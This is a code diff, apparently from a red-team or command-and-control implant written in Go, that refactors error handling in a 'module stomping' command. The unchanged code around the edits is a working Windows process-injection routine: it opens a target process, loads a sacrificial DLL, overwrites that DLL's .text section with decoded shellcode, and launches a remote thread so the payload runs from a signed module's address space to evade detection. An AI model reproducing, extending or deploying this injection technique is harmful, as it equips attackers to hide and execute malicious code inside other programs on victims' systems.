@@ -47,37 +47,21 @@ type moduleStompingParams struct {
 
 func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	var params moduleStompingParams
 	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil || len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: invalid or empty shellcode data",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: invalid or empty shellcode data")
 	}
 
 	if params.PID <= 0 {
-		return structs.CommandResult{
-			Output:    "Error: invalid PID specified",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: invalid PID specified")
 	}
 
 	if params.DllName == "" {
@@ -105,7 +89,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	hProcess, err := injectOpenProcess(desiredAccess, uint32(params.PID))
 	if err != nil {
 		sb.WriteString(fmt.Sprintf("[!] %v\n", err))
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult(sb.String())
 	}
 	defer injectCloseHandle(hProcess)
 	sb.WriteString("[+] Opened process handle\n")
@@ -114,7 +98,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	dllBase, err := stompLoadRemoteDLL(hProcess, uint32(params.PID), params.DllName, &sb)
 	if err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Failed to load DLL: %v\n", err))
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult(sb.String())
 	}
 	sb.WriteString(fmt.Sprintf("[+] DLL loaded at base: 0x%X\n", dllBase))
 
@@ -122,7 +106,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	textRVA, textSize, err := stompFindRemoteTextSection(hProcess, dllBase)
 	if err != nil {
 		sb.WriteString(fmt.Sprintf("[!] Failed to find .text: %v\n", err))
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult(sb.String())
 	}
 	sb.WriteString(fmt.Sprintf("[*] .text section: RVA=0x%X, Size=%d bytes\n", textRVA, textSize))
 
@@ -131,7 +115,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 		sb.WriteString(fmt.Sprintf("[!] Shellcode (%d bytes) exceeds .text section (%d bytes)\n",
 			len(shellcode), textSize))
 		sb.WriteString("[!] Choose a larger sacrificial DLL or smaller shellcode\n")
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult(sb.String())
 	}
 
 	textAddr := dllBase + uintptr(textRVA)
@@ -140,7 +124,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	oldProtect, err := injectProtectMemory(hProcess, textAddr, len(shellcode), PAGE_READWRITE)
 	if err != nil {
 		sb.WriteString(fmt.Sprintf("[!] VirtualProtect(RW) failed: %v\n", err))
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult(sb.String())
 	}
 	_ = oldProtect
 	sb.WriteString("[+] Changed .text protection to RW\n")
@@ -150,7 +134,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	if err != nil {
 		injectProtectMemory(hProcess, textAddr, len(shellcode), PAGE_EXECUTE_READ)
 		sb.WriteString(fmt.Sprintf("[!] WriteProcessMemory failed: %v\n", err))
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult(sb.String())
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes to .text at 0x%X\n", written, textAddr))
 
@@ -158,7 +142,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	_, err = injectProtectMemory(hProcess, textAddr, len(shellcode), PAGE_EXECUTE_READ)
 	if err != nil {
 		sb.WriteString(fmt.Sprintf("[!] VirtualProtect(RX) failed: %v\n", err))
-		return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+		return errorResult(sb.String())
 	}
 	sb.WriteString("[+] Restored .text protection to RX\n")
 
@@ -168,7 +152,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 		status := IndirectNtCreateThreadEx(&hThread, hProcess, textAddr)
 		if status != 0 {
 			sb.WriteString(fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status))
-			return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+			return errorResult(sb.String())
 		}
 	} else {
 		var tid uintptr
@@ -176,7 +160,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 			uintptr(unsafe.Pointer(&tid)))
 		if hThread == 0 {
 			sb.WriteString(fmt.Sprintf("[!] CreateRemoteThread failed: %v\n", err))
-			return structs.CommandResult{Output: sb.String(), Status: "error", Completed: true}
+			return errorResult(sb.String())
 		}
 	}
 	defer injectCloseHandle(hThread)
@@ -185,11 +169,7 @@ func (c *ModuleStompingCommand) Execute(task structs.Task) structs.CommandResult
 	sb.WriteString("[+] Shellcode executing from signed DLL address space\n")
 	sb.WriteString("[+] Module stomping injection completed successfully\n")
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "completed",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // stompLoadRemoteDLL loads a DLL into the target process via CreateRemoteThread + LoadLibraryW,
